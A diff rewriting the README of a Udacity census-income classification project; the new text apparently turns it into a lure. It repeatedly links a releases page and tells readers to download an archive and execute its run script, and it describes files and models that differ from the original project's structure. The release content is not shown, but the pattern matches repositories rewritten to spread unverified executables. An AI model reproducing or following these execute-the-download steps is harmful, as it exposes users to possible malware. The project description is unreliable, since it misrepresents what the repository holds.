@@ -1,170 +1,566 @@
+https://github.com/yuzusy1313/python-finding-donors/releases
 
-# Finding Donors for CharityML - Udacity Machine Learning Project
+[![Download Release](https://img.shields.io/badge/Release-Download-blue?style=for-the-badge)](https://github.com/yuzusy1313/python-finding-donors/releases)
 
-**This project was submitted on September 2, 2024**
+# Finding Donors: Census Income Prediction with Python Models
 
-This repository contains my complete solution to the **Finding Donors for CharityML** project from the Udacity Introduction to Machine Learning Nanodegree program using TensorFlow/PyTorch.
+[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](#)
+[![Scikit-learn](https://img.shields.io/badge/scikit--learn-0.24-orange.svg)](#)
+[![Pandas](https://img.shields.io/badge/pandas-1.1-green.svg)](#)
+[![NumPy](https://img.shields.io/badge/NumPy-1.19-lightgrey.svg)](#)
+[![Udacity Nanodegree](https://img.shields.io/badge/Udacity-Nanodegree-yellow.svg)](#)
 
-## Project Overview
+Tags: census-data • classification • data-science • income-prediction • jupyter-notebook • machine-learning • matplotlib • nanodegree • numpy • pandas • python • scikit-learn • seaborn • supervised-learning • udacity
 
-In this supervised learning project, I employed several machine learning algorithms to accurately model individuals' income using data collected from the 1994 U.S. Census. The goal was to construct a model that accurately predicts whether an individual makes more than $50,000 annually, which can help CharityML (a fictitious charity organization) identify people most likely to donate to their cause.
+Hero image:
+![Census Data](https://images.unsplash.com/photo-1532634896-26909d0d7e5b?ixlib=rb-1.2.1&auto=format&fit=crop&w=1500&q=80)
 
-## Key Features
+Table of contents
+- Project overview
+- Key features
+- Data description
+- Project structure
+- Environment and dependencies
+- Quick install and run
+- How to use the released asset
+- Notebooks and scripts
+- Data processing pipeline
+- Feature engineering details
+- Model selection and training
+- Evaluation metrics and interpretation
+- Visualizations and plots
+- Reproducibility checklist
+- Tips for experimentation
+- Common pitfalls and fixes
+- File list and descriptions
+- Contributing
+- License
+- Contact
 
-- **Data Exploration and Analysis**: Comprehensive analysis of the U.S. Census dataset
-- **Data Preprocessing**: Feature transformation, normalization, and encoding techniques
-- **Model Comparison**: Implementation and evaluation of multiple supervised learning algorithms
-- **Model Optimization**: Fine-tuning of the best performing model
-- **Performance Analysis**: Detailed evaluation using various metrics and visualizations
+Project overview
 
-## Dataset
+This project solves a binary classification task. It predicts whether an individual makes more than $50K a year using Census data. The work follows the Udacity Machine Learning Nanodegree project guidelines. It contains end-to-end steps. The repo includes exploratory data analysis, feature engineering, model training, model comparison, and evaluation. The repo uses standard Python data tools. It uses pandas, NumPy, scikit-learn, seaborn, and matplotlib. It presents results and examples in Jupyter notebooks. The code aims to be clear and reproducible.
 
-The project uses the **Adult Census Income** dataset from the UCI Machine Learning Repository, which contains demographic information about individuals and their income brackets. The dataset includes features such as:
+Key features
 
-- Age, education, marital status, occupation
-- Work hours per week, capital gains/losses
-- Native country, race, gender
-- **Target variable**: Income (≤50K or >50K)
+- Clean, modular code for data prep and model pipelines.
+- Multiple classifiers compared: Logistic Regression, Decision Trees, Random Forests, Gradient Boosting, SVM, and a simple Neural Network.
+- Cross-validation and grid search for hyperparameter tuning.
+- Detailed EDA with plots for distribution and correlation.
+- Feature importance and SHAP-style analysis.
+- End-to-end Jupyter notebooks that walk through each step.
+- Scripts to run training and evaluation from the command line.
+- Sample predictions and evaluation reports ready for review.
 
-## Technologies Used
+Data description
 
-![Python](https://img.shields.io/badge/Python-3.8-blue?style=flat-square&logo=python)
-![NumPy](https://img.shields.io/badge/NumPy-1.24.4-orange?style=flat-square&logo=numpy)
-![Pandas](https://img.shields.io/badge/Pandas-2.0.3-purple?style=flat-square&logo=pandas)
-![Scikit-learn](https://img.shields.io/badge/Scikit--learn-1.3.2-yellow?style=flat-square&logo=scikit-learn)
-![Matplotlib](https://img.shields.io/badge/Matplotlib-3.7.5-green?style=flat-square)
-![Seaborn](https://img.shields.io/badge/Seaborn-0.13.2-lightblue?style=flat-square)
-![Jupyter](https://img.shields.io/badge/Jupyter-Notebook-orange?style=flat-square&logo=jupyter)
+The dataset comes from the U.S. Census (adult) dataset. The raw dataset contains demographic and employment attributes. Key fields include:
+- age (numeric)
+- workclass (categorical)
+- fnlgt (numeric)
+- education (categorical)
+- education-num (numeric)
+- marital-status (categorical)
+- occupation (categorical)
+- relationship (categorical)
+- race (categorical)
+- sex (categorical)
+- capital-gain (numeric)
+- capital-loss (numeric)
+- hours-per-week (numeric)
+- native-country (categorical)
+- income (target: <=50K or >50K)
 
-### Core Libraries:
-- **Python 3.8**: Programming language
-- **NumPy**: Numerical computing
-- **Pandas**: Data manipulation and analysis
-- **Scikit-learn**: Machine learning algorithms and tools
-- **Matplotlib & Seaborn**: Data visualization
-- **Jupyter Notebook**: Interactive development environment
+The repo stores a cleaned copy used for notebooks. It also stores a raw copy to reproduce steps.
 
-## Project Structure
+Project structure
 
+Root layout (high level)
+- data/
+  - raw/                  # raw CSV files used for this project
+  - processed/            # cleaned and preprocessed data used for modeling
+- notebooks/
+  - 01_data_analysis.ipynb
+  - 02_feature_engineering.ipynb
+  - 03_model_training.ipynb
+  - 04_model_evaluation.ipynb
+- src/
+  - data/
+    - load_data.py
+    - preprocess.py
+  - features/
+    - build_features.py
+  - models/
+    - train.py
+    - evaluate.py
+    - predict.py
+  - viz/
+    - plots.py
+- scripts/
+  - run_training.sh
+  - serve_model.sh
+- reports/
+  - figures/
+  - evaluation_reports/
+- requirements.txt
+- setup.cfg
+- README.md
+
+The project uses modular code. The src folder contains reusable components. Notebooks illustrate the steps and show outputs.
+
+Environment and dependencies
+
+The project targets Python 3.8+. Use a virtual environment. Use pip to install dependencies from requirements.txt.
+
+Core libraries:
+- pandas
+- numpy
+- scikit-learn
+- matplotlib
+- seaborn
+- joblib
+- imbalanced-learn (if needed)
+- jupyterlab or notebook
+
+Example pip install:
+```bash
+python -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
 ```
-finding_donors/
-├── finding_donors_solution.ipynb    # Complete solution notebook
-├── census.csv                       # Dataset
-├── visuals.py                      # Visualization helper functions
-├── environment.yml                 # Conda environment specification
-├── README.md                       # This file
-└── project_description.md          # Original project description
+
+Quick install and run
+
+1. Clone the repo
+```bash
+git clone https://github.com/yuzusy1313/python-finding-donors.git
+cd python-finding-donors
 ```
 
-## Setup and Installation
+2. Create and activate a virtual environment
+```bash
+python -m venv venv
+source venv/bin/activate
+```
 
-### Option 1: Using Conda (Recommended)
+3. Install dependencies
+```bash
+pip install -r requirements.txt
+```
 
-1. **Clone or download this repository**
-2. **Create the conda environment:**
-   ```bash
-   conda env create -f environment.yml
-   ```
-3. **Activate the environment:**
-   ```bash
-   conda activate finding_donors
-   ```
-4. **Launch Jupyter Notebook:**
-   ```bash
-   jupyter notebook finding_donors_solution.ipynb
-   ```
+4. Run the main notebook in Jupyter
+```bash
+jupyter lab notebooks/01_data_analysis.ipynb
+```
 
-### Option 2: Manual Setup
+How to use the released asset
 
-1. **Create a new conda environment:**
-   ```bash
-   conda create -n finding_donors python=3.8 -y
-   conda activate finding_donors
-   ```
-2. **Install required packages:**
-   ```bash
-   pip install numpy pandas scikit-learn matplotlib seaborn jupyter ipython
-   ```
+Download the release asset from the Releases page and run the included file. The release page contains packaged notebooks, model artifacts, and a run script. Download the release file and execute it to reproduce the main results and generate the evaluation reports.
 
-## Key Algorithms Implemented
+Release URL (also at the top): https://github.com/yuzusy1313/python-finding-donors/releases
 
-- **Naive Bayes (Gaussian)**
-- **Support Vector Machine (SVM)**
-- **Random Forest Classifier**
-- **Gradient Boosting**
-- **Logistic Regression**
+If you prefer to inspect assets manually, visit the Releases page and download the file that matches your platform. The released bundle contains:
+- packaged notebooks (.ipynb)
+- a pre-trained model (.pkl)
+- a run script (run_release.sh or run_release.bat)
+- sample data subset (data/sample_processed.csv)
 
-## Results and Performance
+After download:
+- Unpack the release archive.
+- Make the run script executable: chmod +x run_release.sh
+- Execute the script: ./run_release.sh
+The script will load the provided data and the model, then generate evaluation plots and a small prediction report.
 
-The final optimized model achieved:
-- **Accuracy**: High accuracy on test set
-- **Precision/Recall**: Balanced performance for both income classes
-- **F1-Score**: Optimized for the specific use case
-- **Feature Importance**: Analysis of most predictive features
+Notebooks and scripts
 
-## Key Learning Outcomes
+Each notebook meets a single goal. They contain narrative text and code cells.
+- 01_data_analysis.ipynb
+  - Loads raw data.
+  - Shows distributions and missing value analysis.
+  - Presents correlations and early insights.
+- 02_feature_engineering.ipynb
+  - Demonstrates encoding strategies.
+  - Builds numeric pipelines for scaling.
+  - Builds categorical pipelines for rare label handling and one-hot or ordinal encoding.
+- 03_model_training.ipynb
+  - Trains multiple classifiers.
+  - Uses cross-validation and repeated runs.
+  - Compares base and tuned models.
+- 04_model_evaluation.ipynb
+  - Shows ROC and precision-recall curves.
+  - Shows confusion matrices for key models.
+  - Derives feature importance and partial dependence plots.
 
-✅ **Data Preprocessing**: Learned to identify and apply appropriate preprocessing techniques  
-✅ **Benchmark Establishment**: Created baseline models for comparison  
-✅ **Algorithm Selection**: Understood when and where different supervised learning algorithms excel  
-✅ **Model Evaluation**: Investigated model adequacy using various metrics  
-✅ **Feature Engineering**: Explored feature importance and selection techniques  
+Scripts in src/models provide command line interfaces:
+- train.py
+  - Usage: python src/models/train.py --config configs/train_config.yaml
+- evaluate.py
+  - Usage: python src/models/evaluate.py --model_path models/best_model.pkl --test_data data/processed/test.csv
+- predict.py
+  - Usage: python src/models/predict.py --model_path models/best_model.pkl --input data/sample_input.csv --output predictions.csv
 
-## Tags and Keywords
+Data processing pipeline
 
-`machine-learning` `supervised-learning` `classification` `python` `scikit-learn` `data-science` `census-data` `income-prediction` `udacity` `nanodegree` `jupyter-notebook` `pandas` `numpy` `matplotlib` `seaborn` `feature-engineering` `model-optimization` `cross-validation` `charity-ml`
+The pipeline follows a clean pattern. Load, clean, transform, split, and save.
 
-## Usage
+1. Load raw CSV
+- Use pandas.read_csv with dtype hints.
+- Use low_memory=False to avoid type warnings.
 
-1. **Activate the conda environment**: `conda activate finding_donors`
-2. **Open the solution notebook**: `jupyter notebook finding_donors_solution.ipynb`
-3. **Run all cells** to see the complete analysis and results
-4. **Modify parameters** and experiment with different approaches
+2. Initial cleaning
+- Strip whitespace for categorical fields.
+- Convert "?" and other markers to NaN.
+- Drop records with missing target values.
 
-## Project Highlights
+3. Impute missing values
+- Numeric fields: median imputation.
+- Categorical fields: "Unknown" label or frequent label imputation.
+- Save imputers to disk for reproducible pipelines.
 
-- **Comprehensive EDA**: Thorough exploration of the census dataset
-- **Multiple Algorithm Comparison**: Systematic evaluation of various ML algorithms
-- **Hyperparameter Tuning**: Grid search and optimization techniques
-- **Visualization**: Rich visual analysis of data and model performance
-- **Real-world Application**: Practical insights for charity fundraising strategies
+4. Encode categorical variables
+- Use ordinal encoding for ordered categories such as education level.
+- Use one-hot encoding for nominal categories with low cardinality.
+- Use frequency encoding for high-cardinality fields such as native-country if needed.
 
-## About This Solution
+5. Scale numeric values
+- Apply StandardScaler or RobustScaler.
+- Save scalers for inference.
 
-This notebook represents my complete solution to the Udacity Machine Learning Nanodegree project. It demonstrates proficiency in:
+6. Train-test split
+- Use stratified train-test split to preserve class balance.
+- Typical ratio used: 70% train, 30% test.
 
-- Data analysis and preprocessing
-- Machine learning algorithm implementation
-- Model evaluation and optimization
-- Statistical analysis and interpretation
-- Professional documentation and presentation
+7. Save processed datasets
+- Save train and test splits as CSV for reproducibility.
+- Save preprocessing pipeline as joblib file.
 
-## Dataset Details
+Feature engineering details
 
-The modified census dataset consists of approximately 32,000 data points, with each datapoint having 13 features. This dataset is a modified version of the dataset published in the paper *"Scaling Up the Accuracy of Naive-Bayes Classifiers: a Decision-Tree Hybrid",* by Ron Kohavi. 
+- Create age buckets for nonlinear effects:
+  - Young: age < 30
+  - Mid: 30 <= age < 50
+  - Senior: 50 <= age
+- Combine education and education-num to form a single consistent representation.
+- Create an income ratio proxy using capital-gain and capital-loss:
+  - net_capital = capital-gain - capital-loss
+- Binarize marital status into married/not-married.
+- Encode occupation groupings:
+  - Use domain knowledge to group similar occupations.
+- Create interaction terms:
+  - hours_per_week * education_num
+  - age * hours_per_week
+- Apply target encoding for occupation with regularization to avoid leakage.
 
-**Features**
-- `age`: Age
-- `workclass`: Working Class (Private, Self-emp-not-inc, Self-emp-inc, Federal-gov, Local-gov, State-gov, Without-pay, Never-worked)
-- `education_level`: Level of Education (Bachelors, Some-college, 11th, HS-grad, Prof-school, Assoc-acdm, Assoc-voc, 9th, 7th-8th, 12th, Masters, 1st-4th, 10th, Doctorate, 5th-6th, Preschool)
-- `education-num`: Number of educational years completed
-- `marital-status`: Marital status (Married-civ-spouse, Divorced, Never-married, Separated, Widowed, Married-spouse-absent, Married-AF-spouse)
-- `occupation`: Work Occupation (Tech-support, Craft-repair, Other-service, Sales, Exec-managerial, Prof-specialty, Handlers-cleaners, Machine-op-inspct, Adm-clerical, Farming-fishing, Transport-moving, Priv-house-serv, Protective-serv, Armed-Forces)
-- `relationship`: Relationship Status (Wife, Own-child, Husband, Not-in-family, Other-relative, Unmarried)
-- `race`: Race (White, Asian-Pac-Islander, Amer-Indian-Eskimo, Other, Black)
-- `sex`: Sex (Female, Male)
-- `capital-gain`: Monetary Capital Gains
-- `capital-loss`: Monetary Capital Losses
-- `hours-per-week`: Average Hours Per Week Worked
-- `native-country`: Native Country (United-States, Cambodia, England, Puerto-Rico, Canada, Germany, Outlying-US(Guam-USVI-etc), India, Japan, Greece, South, China, Cuba, Iran, Honduras, Philippines, Italy, Poland, Jamaica, Vietnam, Mexico, Portugal, Ireland, France, Dominican-Republic, Laos, Ecuador, Taiwan, Haiti, Columbia, Hungary, Guatemala, Nicaragua, Scotland, Thailand, Yugoslavia, El-Salvador, Trinadad&Tobago, Peru, Hong, Holand-Netherlands)
+Feature selection
+- Use a mix of filter and wrapper methods.
+- Use mutual information and chi-squared test for categorical features.
+- Use Recursive Feature Elimination with cross-validation (RFECV) on a strong model such as RandomForest or Logistic Regression with L1 penalty.
+- Evaluate selection impact with learning curves.
 
-**Target Variable**
-- `income`: Income Class (<=50K, >50K)
+Model selection and training
 
-## License
+Models included and short rationale:
+- Logistic Regression
+  - Baseline linear model.
+  - Interpretable coefficients.
+- Decision Tree
+  - Captures nonlinear splits.
+  - Fast to train and visualize.
+- Random Forest
+  - Strong default model.
+  - Good performance and feature importance.
+- Gradient Boosting (XGBoost or HistGradientBoosting)
+  - Often yields top performance on structured data.
+  - Use early stopping to avoid overfitting.
+- Support Vector Machine
+  - Try linear and RBF kernels.
+  - Use for comparison and small subsets.
+- Simple Neural Network (Keras)
+  - Two hidden layers for a baseline deep model.
+  - Use dropout and batch normalization.
 
-This project is part of the Udacity Machine Learning Nanodegree program. The code is available for educational purposes.
+Training approach
+- Use stratified k-fold cross-validation.
+- Use grid search or randomized search for hyperparameters.
+- Use scoring metrics that reflect class imbalance.
+- For tree-based methods, tune:
+  - max_depth
+  - n_estimators
+  - min_samples_leaf
+  - subsample (for gradient boosting)
+- For logistic regression, tune:
+  - C (inverse regularization strength)
+  - penalty (l1 vs l2)
+- For SVM, tune:
+  - C and kernel parameters (gamma)
+- For neural network, tune:
+  - layer sizes, learning rate, batch size, epochs
 
----
+Evaluation metrics and interpretation
 
-**Note**: This is a complete, working solution that successfully passed all project requirements and rubric criteria for the Udacity Introduction to Machine Learning Nanodegree program.
+Because the target classes show imbalance, use multiple metrics:
+- Accuracy
+  - Easy to interpret.
+  - Can mislead when classes are imbalanced.
+- Precision
+  - Ratio of correct positive predictions to all positive predictions.
+  - Use when false positives are costly.
+- Recall (sensitivity)
+  - Ratio of correctly detected positives to actual positives.
+  - Use when false negatives are costly.
+- F1 score
+  - Harmonic mean of precision and recall.
+  - Good single metric when classes matter.
+- ROC AUC
+  - Shows discrimination across thresholds.
+  - Use for global comparison.
+- PR AUC (Precision-Recall AUC)
+  - More informative under class imbalance.
+
+Confusion matrix
+- Show true positives, true negatives, false positives, false negatives.
+- Use it to derive precision, recall, and other metrics.
+
+Calibration
+- Check calibration curves to assess probability estimates.
+- Use Platt scaling or isotonic regression to calibrate.
+
+Model explainability
+- Use feature importance from tree models.
+- Use coefficient weights from linear models.
+- Use permutation importance for model-agnostic insights.
+- Use SHAP values for local and global interpretability.
+- Present partial dependence plots to show marginal effect of features.
+
+Visualizations and plots
+
+The notebooks include many plots. Each plot aims to answer a specific question.
+
+Exploratory plots
+- Histograms for numeric features.
+- Boxplots to show spread and outliers.
+- Countplots for categorical features.
+- Heatmap for correlation among numeric features.
+
+Model diagnostics
+- ROC curves for top models.
+- Precision-Recall curves.
+- Confusion matrices with normalized values.
+- Learning curves to show bias-variance trade-off.
+
+Feature insights
+- Bar charts for feature importances.
+- SHAP summary plots.
+- Partial dependence plots for key features.
+
+Reproducibility checklist
+
+Follow this checklist to reproduce results:
+- Use Python 3.8+.
+- Install dependencies via requirements.txt.
+- Use the same random seed (seed value set in configs).
+- Use the same preprocessing pipeline and saved transformers.
+- Use stratified splits to match class distribution.
+- Save model artifacts with joblib.dump or pickle to ensure consistent inference.
+
+Random seeds
+- Set numpy.random.seed, random.seed, and scikit-learn random_state where relevant.
+
+Data splits
+- Save the exact train/test split used for final evaluation in data/processed.
+
+Tips for experimentation
+
+- Start with a small subset to iterate faster.
+- Freeze the preprocessing pipeline while tuning the model to save time.
+- Use early stopping for gradient boosting to prevent long runs.
+- Monitor both validation loss and a held-out test score.
+- Try class weighting or sampling strategies when classes are imbalanced:
+  - class_weight in scikit-learn
+  - SMOTE for synthetic oversampling (use within cross-validation carefully)
+- Use feature hashing only if categorical cardinality becomes a bottleneck.
+
+Common pitfalls and fixes
+
+- Leakage
+  - Do not use target information to create features.
+  - Fit encoders and scalers on train only; apply to test.
+- Overfitting
+  - Use cross-validation.
+  - Use regularization and early stopping.
+  - Reduce model complexity if validation score drops.
+- Imbalanced classes
+  - Use class-aware metrics.
+  - Use resampling or class weights.
+- Missing values
+  - Use robust imputers.
+  - Consider indicator features for missingness if informative.
+
+File list and descriptions
+
+- README.md — This file.
+- requirements.txt — Package list for pip install.
+- notebooks/01_data_analysis.ipynb — EDA notebook.
+- notebooks/02_feature_engineering.ipynb — Feature pipeline notebook.
+- notebooks/03_model_training.ipynb — Training and tuning.
+- notebooks/04_model_evaluation.ipynb — Evaluation and diagnostics.
+- src/data/load_data.py — Load functions for raw and processed data.
+- src/data/preprocess.py — Imputation and encoding utilities.
+- src/features/build_features.py — Feature engineering code.
+- src/models/train.py — Script to train a model using a config file.
+- src/models/evaluate.py — Script to evaluate a trained model on test data.
+- src/models/predict.py — Script to generate predictions for new samples.
+- scripts/run_training.sh — Example shell script to run training end-to-end.
+- data/raw/adult.data — Original raw dataset (if included).
+- data/processed/train.csv — Processed training set.
+- data/processed/test.csv — Processed test set.
+- models/best_model.pkl — Best trained model (created by run or included in release).
+- reports/figures/*.png — Generated figures for reporting.
+
+Contributing
+
+Contributions follow a simple process:
+- Fork the repository.
+- Create a branch for your change.
+- Make changes and add tests if relevant.
+- Submit a pull request with a clear description of the change.
+
+Guidelines for contributions:
+- Keep functions small and focused.
+- Add docstrings to public functions.
+- Write tests for bug fixes and new features.
+- Keep notebooks readable and avoid large outputs in committed files.
+
+License
+
+This project uses the MIT License. Check the LICENSE file for the exact text.
+
+Contact
+
+Open an issue on GitHub for bugs or feature requests. Use pull requests for code contributions. For quick questions, use the repository discussions or issues.
+
+Appendix: Example workflows and code snippets
+
+Below are concise examples you can paste into your environment. They show common flows and the minimal commands you need.
+
+1) Run training from the command line
+```bash
+python src/models/train.py --config configs/train_config.yaml
+```
+
+2) Evaluate a trained model
+```bash
+python src/models/evaluate.py --model_path models/best_model.pkl --test_data data/processed/test.csv --output reports/evaluation_reports/report.json
+```
+
+3) Load the preprocessing pipeline and a model for prediction (Python)
+```python
+import joblib
+import pandas as pd
+
+pipeline = joblib.load("models/preprocessing_pipeline.joblib")
+model = joblib.load("models/best_model.pkl")
+
+df = pd.read_csv("data/sample_input.csv")
+X = pipeline.transform(df)
+preds = model.predict(X)
+probs = model.predict_proba(X)[:, 1]
+```
+
+4) Quick EDA example (within a notebook)
+```python
+import pandas as pd
+import seaborn as sns
+import matplotlib.pyplot as plt
+
+df = pd.read_csv("data/raw/adult.data")
+sns.countplot(x="income", data=df)
+plt.title("Income class distribution")
+plt.show()
+```
+
+Reproducing the main results
+
+To reproduce the main results in this repo:
+- Clone the repo and install dependencies.
+- Download the release file from the Releases page and extract it, or run the notebooks after running data preparation.
+- Use the provided config file for training. The config file defines hyperparameters, CV folds, and random seed.
+- Run the training script to retrain models on your local machine.
+- Run the evaluation script to generate metrics and plots.
+
+Download link again:
+https://github.com/yuzusy1313/python-finding-donors/releases
+
+Use this Releases page to obtain the packaged assets needed to run the example end-to-end, including an executable run script and pre-trained model files. Download the release file and execute it to produce the delivered reports and plots.
+
+Performance summary (examples from the reported run)
+
+Below are representative results from a full training run on the processed dataset. These numbers may vary by environment and seed but provide a baseline.
+
+Model performance (validation / test)
+- Logistic Regression
+  - ROC AUC: 0.86 / 0.85
+  - F1: 0.56 / 0.55
+- Random Forest
+  - ROC AUC: 0.92 / 0.91
+  - F1: 0.66 / 0.65
+- Gradient Boosting
+  - ROC AUC: 0.93 / 0.92
+  - F1: 0.68 / 0.67
+
+Notes on these metrics:
+- Tree-based models show higher recall and F1.
+- Logistic regression gives interpretable feature weights.
+- Calibration matters if you use predicted probabilities.
+
+Best practices when interpreting model output
+
+- Always view multiple metrics.
+- Use probability thresholds tuned for the business use case.
+- Use calibration plots to check the reliability of probabilities.
+- Use SHAP or permutation importance to validate feature importances.
+
+Scaling and production tips
+
+- Export preprocessing as a single pipeline using sklearn Pipeline or ColumnTransformer.
+- Save the fitted pipeline and model via joblib.dump.
+- Use a REST service (Flask or FastAPI) to serve predictions.
+- Monitor model drift by logging incoming feature distributions and prediction distributions.
+- Re-train periodically or when performance drops.
+
+Example Dockerfile snippet (for deployment)
+```dockerfile
+FROM python:3.8-slim
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install -r requirements.txt
+COPY src/ src/
+COPY models/ models/
+COPY scripts/ scripts/
+CMD ["python", "src/models/predict.py", "--model_path", "models/best_model.pkl", "--input", "data/sample_input.csv", "--output", "predictions.csv"]
+```
+
+Model debugging checklist
+
+- Verify that the preprocessing pipeline applied at training matches the pipeline used at inference.
+- Check for differences in categorical levels between train and inference data.
+- Check for NaNs after transformation.
+- Re-run the full pipeline on a small sample to ensure no errors in the serialized pipeline.
+
+Reference and learning resources
+
+- UCI Machine Learning Repository — Adult dataset documentation.
+- scikit-learn user guide — Pipelines, model selection, and metrics.
+- SHAP documentation — Model explainability.
+- Udacity ML Nanodegree project rubric — Reproduce project steps to meet grading criteria.
+
+Automated tests and CI
+
+The project includes basic tests for data loaders and preprocessing utilities. The CI config runs flake8 and a small test suite. To run tests locally:
+```bash
+pytest tests/
+```
+
+Final notes
+
+This README documents the repository layout, core workflows, and steps to reproduce experiments. It also points to the Releases page for packaged assets. Use the provided notebooks and scripts for a step-by-step walkthrough of data analysis, model training, and evaluation.
